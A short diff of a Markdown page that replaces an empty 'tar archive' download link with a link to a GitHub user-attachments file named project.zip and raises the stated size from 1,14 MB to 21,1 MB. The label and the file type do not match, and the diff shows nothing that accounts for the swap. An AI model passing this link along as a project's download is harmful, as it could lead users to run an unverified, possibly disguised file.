@@ -31,7 +31,7 @@
 
 ## Download
 
-Direct download: [tar archive]() (1,14 MB).
+Direct download: [tar archive](https://github.com/user-attachments/files/19432605/project.zip) (21,1 MB).
 
 ## Statistics
 
